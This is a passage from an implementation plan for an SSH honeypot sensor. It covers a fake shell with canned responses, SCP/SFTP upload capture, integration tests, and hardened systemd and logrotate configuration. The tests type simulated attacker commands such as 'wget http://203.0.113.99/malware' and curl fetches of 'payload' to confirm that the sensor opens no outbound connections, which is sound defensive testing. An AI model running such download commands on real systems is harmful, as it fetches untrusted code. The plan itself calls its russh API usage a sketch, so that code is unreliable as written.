            protocol: PROTO_TCP.into(),
            authenticated: self.ctx.authenticated,
            observed_at: chrono::Utc::now(),
            metadata: serde_json::json!({
                "protocol_label": "ssh",
                "command": sanitized_cmd,
            }),
            sample: None,
        };

        let parts: Vec<&str> = line.split_whitespace().collect();
        let output = match parts.first().map(|s| *s) {
            Some("uname") => "Linux server01 5.15.0-91-generic #101-Ubuntu SMP x86_64\n".into(),
            Some("id") => "uid=0(root) gid=0(root) groups=0(root)\n".into(),
            Some("whoami") => "root\n".into(),
            Some("pwd") => format!("{}\n", self.cwd),
            Some("echo") => format!("{}\n", parts[1..].join(" ")),
            Some("cat") => {
                if let Some(path) = parts.get(1) {
                    self.fs.read_file(path).unwrap_or_else(|| format!("cat: {path}: No such file or directory\n"))
                } else {
                    String::new()
                }
            }
            Some("ls") => {
                let target = parts.get(1).map(|s| *s).unwrap_or(&self.cwd);
                match self.fs.list_dir(target) {
                    Some(entries) => entries.join("  ") + "\n",
                    None => format!("ls: cannot access '{target}': No such file or directory\n"),
                }
            }
            Some("wget") | Some("curl") => {
                // Canned "download" transcript. ZERO network I/O.
                let url = parts.get(1).unwrap_or(&"");
                let sanitized_url = sanitize_value(url, 512);
                format!("Connecting to {sanitized_url}... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1234 (1.2K)\nSaving to: 'index.html'\nindex.html          100%[==================>]   1.2K  --.-KB/s    in 0s\n")
            }
            Some("cd") => {
                if let Some(dir) = parts.get(1) {
                    self.cwd = dir.to_string();
                }
                String::new()
            }
            Some("exit") | Some("logout") => String::new(),
            _ => format!("{}: command not found\n", parts.first().unwrap_or(&"")),
        };

        (output, vec![event])
    }
}
```

**Critical guarantee:** this module does NOT import `std::process`, does NOT spawn subprocesses, does NOT evaluate any attacker input as code. Every command returns a canned string. The `never_exec_static_check` test verifies this at the source level.

**Critical guarantee:** wget/curl handlers produce canned output and perform ZERO network I/O. There is no HTTP client in the dependency tree. The `no_outbound_connection` test (Task 14 integration) verifies this at runtime.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-ssh --test shell_test`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/sensor-ssh/src/shell.rs crates/sensor-ssh/src/fakefs.rs crates/sensor-ssh/tests/shell_test.rs
git commit -m "feat(sensor-ssh): fake shell with command capture and never-exec guarantee"
```

---

### Task 14: SCP/SFTP capture + binary composition + real-client integration

**Files:**
- Create: `crates/sensor-ssh/src/transfer.rs`, `crates/sensor-ssh/tests/integration.rs`
- Modify: `crates/sensor-ssh/src/main.rs` (wire everything together)

**Interfaces:**
- Consumes: channel I/O (Task 12), `CaptureHandoff` (Task 6), `QuarantineSpool` (Task 4), `SensorEvent` from `sensor-wire`.
- Produces: `ScpReceiver::handle(channel_data) -> Result<Vec<SensorEvent>>`, `SftpHandler::handle(channel_data) -> Result<Vec<SensorEvent>>`. The `main.rs` composition wires the full SSH session: transport -> auth -> channel -> shell/transfer.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-ssh/tests/integration.rs
// This is the real-client integration test using russh.

use std::net::SocketAddr;
use std::time::Duration;
use std::sync::Arc;

#[tokio::test]
async fn ssh_handshake_and_session_with_real_client() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    std::fs::create_dir(&spool_dir).unwrap();
    let host_key_path = dir.path().join("host_key");

    // Start the SSH honeypot on an ephemeral port.
    let (addr, handle) = sensor_ssh::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir.clone(),
        host_key_path,
    ).await.unwrap();

    // Connect with russh client.
    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(
        config,
        addr,
        TestHandler,
    ).await.unwrap();

    // Authenticate.
    let auth_result = session.authenticate_password("attacker", "password123").await.unwrap();
    assert!(auth_result, "authentication must succeed (accept-all)");

    // Open a channel and run commands.
    let mut channel = session.channel_open_session().await.unwrap();
    channel.request_pty(false, "xterm", 80, 24, 0, 0, &[]).await.unwrap();
    channel.request_shell(false).await.unwrap();

    // Type commands.
    channel.data(b"uname -a\n".as_ref().into()).await.unwrap();
    channel.data(b"wget http://203.0.113.99/malware\n".as_ref().into()).await.unwrap();

    // Give the server time to process and emit events.
    tokio::time::sleep(Duration::from_millis(500)).await;
    channel.eof().await.unwrap();
    drop(channel);
    drop(session);
    tokio::time::sleep(Duration::from_millis(200)).await;
    handle.abort();

    // Read and verify events.
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();

    // Must have: honeypot_connection, honeypot_login_attempt, and command_exec events.
    let signal_types: Vec<&str> = events.iter().map(|e| e.signal_type.as_str()).collect();
    assert!(signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_CONNECTION),
        "missing honeypot_connection event");
    assert!(signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT),
        "missing honeypot_login_attempt event");
    assert!(signal_types.iter().any(|s| *s == sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC),
        "missing honeypot_command_exec event");

    // Verify protocol_label = "ssh" on all events.
    for event in &events {
        let label = event.metadata.get("protocol_label").and_then(|v| v.as_str());
        assert_eq!(label, Some("ssh"), "protocol_label must be 'ssh'");
    }

    // Verify protocol = "tcp" on all events.
    for event in &events {
        assert_eq!(event.protocol, sensor_wire::PROTO_TCP);
    }

    // Verify authenticated semantics: honeypot_connection has authenticated=false,
    // everything after login has authenticated=true.
    let conn_event = events.iter().find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_CONNECTION).unwrap();
    assert!(!conn_event.authenticated);
    let login_event = events.iter().find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT).unwrap();
    assert!(login_event.authenticated);

    // PII discipline: password must not appear in any event.
    let all_json = serde_json::to_string(&events).unwrap();
    assert!(!all_json.contains("password123"), "password must never appear in events");
}

#[tokio::test]
async fn no_outbound_connections() {
    // Start a "target" server that the fake wget/curl would connect to if it
    // actually made network requests. Verify it receives zero connections.
    let target_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let target_addr = target_listener.local_addr().unwrap();
    let connection_count = std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0));
    let count = connection_count.clone();
    let target_task = tokio::spawn(async move {
        loop {
            if let Ok((_stream, _addr)) = target_listener.accept().await {
                count.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            }
        }
    });

    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = sensor_ssh::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
    ).await.unwrap();
    std::fs::create_dir_all(dir.path().join("spool")).unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler).await.unwrap();
    session.authenticate_password("root", "pass").await.unwrap();
    let mut channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    // Type wget/curl pointing at the target server.
    let cmd = format!("wget http://127.0.0.1:{}/malware.bin\n", target_addr.port());
    channel.data(cmd.as_bytes().into()).await.unwrap();
    let cmd = format!("curl http://127.0.0.1:{}/payload\n", target_addr.port());
    channel.data(cmd.as_bytes().into()).await.unwrap();
    tokio::time::sleep(Duration::from_secs(1)).await;
    drop(channel);
    drop(session);
    handle.abort();
    target_task.abort();

    assert_eq!(connection_count.load(std::sync::atomic::Ordering::Relaxed), 0,
        "sensor must open ZERO outbound connections");
}

// Minimal russh client handler.
struct TestHandler;

impl russh::client::Handler for TestHandler {
    type Error = russh::Error;
    // Accept any host key (this is a test against our own honeypot).
    async fn check_server_key(
        &mut self, _key: &russh::keys::key::PublicKey,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }
}
```

Note: the `russh` API above is a best-effort sketch. **Verify the actual `russh` crate API against its current docs before implementation.** The handler trait methods and `channel` API may differ.

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-ssh --test integration`
Expected: FAIL - `start_test_server` not defined, transfer module missing.

- [ ] **Step 3: Write minimal implementation**

`transfer.rs` - SCP and SFTP inbound capture:

SCP server mode (`scp -t <path>`): the client opens an exec channel with command `scp -t <path>`. The protocol is simple:
1. Server sends `\0` (acknowledge ready).
2. Client sends `C<mode> <size> <filename>\n`.
3. Server sends `\0`.
4. Client sends `<size>` bytes of file data.
5. Client sends `\0`.
6. Server sends `\0`.

The handler reads the file data, submits it to `CaptureHandoff` with the sanitized `orig_name`, and emits `honeypot_malware_upload`.

SFTP subsystem: the client opens a subsystem channel with name `sftp`. SFTP is a binary protocol:
- `SSH_FXP_INIT` / `SSH_FXP_VERSION` (version negotiation)
- `SSH_FXP_OPEN` (open file for writing)
- `SSH_FXP_WRITE` (write data)
- `SSH_FXP_CLOSE` (close file)

The handler accumulates write data per file handle, and on close submits the body to `CaptureHandoff`. Emits `honeypot_malware_upload` for writes, `honeypot_file_download` for reads (but reads are never served - the fake filesystem has no real content to serve from SFTP).

**Critical:** no FTP RETR, no FTP PORT bounce, no outbound fetch. These verbs are never honored. If a protocol verb's semantics are "the server goes and gets something," it is refused.

`main.rs` - full composition:

Wire the complete SSH session flow:
1. Accept TCP connection.
2. Version exchange.
3. Key exchange (KEXINIT, ECDH, NEWKEYS).
4. Emit `honeypot_connection` event (authenticated=false).
5. Service request (ssh-userauth) -> accept.
6. User-auth -> accept all, emit `honeypot_login_attempt` (authenticated=true).
7. Channel open -> confirm.
8. Channel request -> dispatch to shell (pty+shell), exec (SCP or command), or subsystem (SFTP).
9. Channel data -> feed to shell/SCP/SFTP handler.
10. Shell commands -> emit `honeypot_command_exec` per command.
11. File transfers -> emit `honeypot_malware_upload` via `CaptureHandoff`.

Expose `start_test_server` for integration tests: starts the server on a given address with specified log/spool/hostkey paths, returns `(SocketAddr, JoinHandle)`.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-ssh --test integration`
Expected: PASS. Then run the full workspace gate: `cargo test --workspace && cargo clippy --workspace -- -D warnings && cargo fmt --all -- --check`

- [ ] **Step 5: Commit**

```bash
git add crates/sensor-ssh
git commit -m "feat(sensor-ssh): SCP/SFTP capture, binary composition, and real-client integration"
```

---

### Task 15: Log rotation + systemd unit hardening

**Files:**
- Create: `deploy/sensor-catchall.service`, `deploy/sensor-ssh.service`, `deploy/logrotate-sensors.conf`
- Test: `crates/sensor-framework/tests/deploy_test.rs` (unit file parsing + rotation test)

**Interfaces:**
- Consumes: the sensor binaries (Tasks 7, 14).
- Produces: deployable systemd units and logrotate config. This is the final task; after this, SP2 is built.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-framework/tests/deploy_test.rs

#[test]
fn catchall_unit_has_hardening_directives() {
    let unit = std::fs::read_to_string(
        concat!(env!("CARGO_MANIFEST_DIR"), "/../../deploy/sensor-catchall.service")
    ).unwrap();
    assert_unit_hardened(&unit, "sensor-catchall");
}

#[test]
fn ssh_unit_has_hardening_directives() {
    let unit = std::fs::read_to_string(
        concat!(env!("CARGO_MANIFEST_DIR"), "/../../deploy/sensor-ssh.service")
    ).unwrap();
    assert_unit_hardened(&unit, "sensor-ssh");
}

fn assert_unit_hardened(unit: &str, name: &str) {
    // Least authority.
    assert!(unit.contains("NoNewPrivileges=yes"), "{name}: missing NoNewPrivileges");
    assert!(unit.contains("ProtectSystem=strict"), "{name}: missing ProtectSystem=strict");
    assert!(unit.contains("ProtectHome=yes"), "{name}: missing ProtectHome");
    assert!(unit.contains("PrivateTmp=yes"), "{name}: missing PrivateTmp");
    assert!(unit.contains("RestrictAddressFamilies=AF_INET AF_INET6"),
        "{name}: missing RestrictAddressFamilies");

    // Must run as a non-root dedicated user.
    assert!(unit.contains("User="), "{name}: missing User directive");
    let user_line = unit.lines().find(|l| l.starts_with("User=")).unwrap();
    assert_ne!(user_line, "User=root", "{name}: must not run as root");

    // Resource caps.
    assert!(unit.contains("MemoryMax="), "{name}: missing MemoryMax");
    assert!(unit.contains("TasksMax="), "{name}: missing TasksMax");
    assert!(unit.contains("LimitNOFILE="), "{name}: missing LimitNOFILE");

    // Containment.
    assert!(unit.contains("CPUQuota="), "{name}: missing CPUQuota");

    // Containment.
    assert!(unit.contains("SystemCallFilter="), "{name}: missing SystemCallFilter");
    assert!(unit.contains("MemoryDenyWriteExecution=yes"),
        "{name}: missing MemoryDenyWriteExecution");
}

#[test]
fn ssh_unit_has_cap_net_bind() {
    let unit = std::fs::read_to_string(
        concat!(env!("CARGO_MANIFEST_DIR"), "/../../deploy/sensor-ssh.service")
    ).unwrap();
    // SSH binds port 22 (privileged), so it needs CAP_NET_BIND_SERVICE.
    assert!(unit.contains("AmbientCapabilities=CAP_NET_BIND_SERVICE"));
    assert!(unit.contains("CapabilityBoundingSet=CAP_NET_BIND_SERVICE"));
}

#[test]
fn logrotate_config_exists_and_is_size_based() {
    let config = std::fs::read_to_string(
        concat!(env!("CARGO_MANIFEST_DIR"), "/../../deploy/logrotate-sensors.conf")
    ).unwrap();
    assert!(config.contains("size "), "rotation must be size-based");
    assert!(config.contains("rotate "), "must specify retained generations");
    assert!(
        config.contains("copytruncate") || config.contains("postrotate"),
        "must use copytruncate or a reopen-on-signal mechanism"
    );
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-framework --test deploy_test`
Expected: FAIL - service files do not exist.

- [ ] **Step 3: Write minimal implementation**

`deploy/sensor-catchall.service`:
```ini
[Unit]
Description=Propolis catch-all sensor
After=network.target

[Service]
Type=simple
User=propolis-catchall
ExecStart=/usr/local/bin/sensor-catchall --config /etc/propolis/catchall.toml

# Least authority
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
RestrictAddressFamilies=AF_INET AF_INET6
ReadWritePaths=/var/log/propolis/catchall /var/spool/propolis/catchall

# Privileged port binding
AmbientCapabilities=CAP_NET_BIND_SERVICE
CapabilityBoundingSet=CAP_NET_BIND_SERVICE

# Resource caps
MemoryMax=256M
TasksMax=64
CPUQuota=50%
LimitNOFILE=4096

# Containment
SystemCallFilter=@system-service
SystemCallFilter=~@privileged @resources
MemoryDenyWriteExecution=yes

[Install]
WantedBy=multi-user.target
```

`deploy/sensor-ssh.service`: similar structure, with `User=propolis-ssh` and SSH-specific paths. Include `CAP_NET_BIND_SERVICE` for port 22.

**Important:** the `SystemCallFilter` allowlist in the units above is a PLACEHOLDER. The spec requires that the exact syscall set is **derived empirically against the running binary** (`strace -c` or `seccomp-tools`), not copied from documentation. During deployment, the operator must:
1. Run the sensor under `strace -c` with representative traffic.
2. Derive the minimum syscall set from the trace.
3. Replace the placeholder `@system-service` group with the exact allowlist.
4. Test that the sensor functions correctly under the restricted filter.

The plan's test verifies the DIRECTIVE IS PRESENT (not that the exact set is correct, since correctness requires the running binary). A comment in the unit file records this requirement.

`deploy/logrotate-sensors.conf`:
```
/var/log/propolis/catchall/events.jsonl
/var/log/propolis/ssh/events.jsonl {
    size 100M
    rotate 5
    copytruncate
    compress
    delaycompress
    missingok
    notifempty
}
```

**Spool mount hardening:** the spec requires the spool directory to be a `noexec,nosuid,nodev` mount, not merely a directory of non-executable files. This is enforced via the service unit's mount options or a dedicated mount entry. Add a `ReadWritePaths` path for the spool that points to a mount with these options. The test asserts the unit specifies the spool path; the mount option enforcement is a deployment-level check (the running system, not the unit file alone).

**Rotation survival deferral:** the spec's testing strategy lists "Rotation is survivable end to end" as a this-layer deliverable. The full test requires SP3's intake cursor (the tailer). This task delivers the rotation config and the sensor's ability to survive rotation (copytruncate preserves the fd). The end-to-end pairing test (rotation + cursor = no lost events, no duplicates) is deferred to SP3 where the cursor is built. This deferral is explicit, not silent.

`copytruncate` is chosen because it preserves the sensor's open file descriptor: the sensor keeps writing to the same fd, and logrotate truncates the file after copying. The trade-off is a small window where events written between copy and truncate are lost. The spec requires that the rotation + tailer pairing is verified end-to-end (the rotation survival test), which is an integration test for SP3's intake cursor, not this task alone. This task delivers the rotation config; SP3 verifies the pairing end-to-end.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-framework --test deploy_test`
Expected: PASS. Then run the full workspace gate one final time:
```bash
cargo test --workspace && cargo clippy --workspace -- -D warnings && cargo fmt --all -- --check
```

- [ ] **Step 5: Commit**

```bash
git add deploy crates/sensor-framework/tests/deploy_test.rs
git commit -m "feat(deploy): hardened systemd units and log rotation for sensors"
```
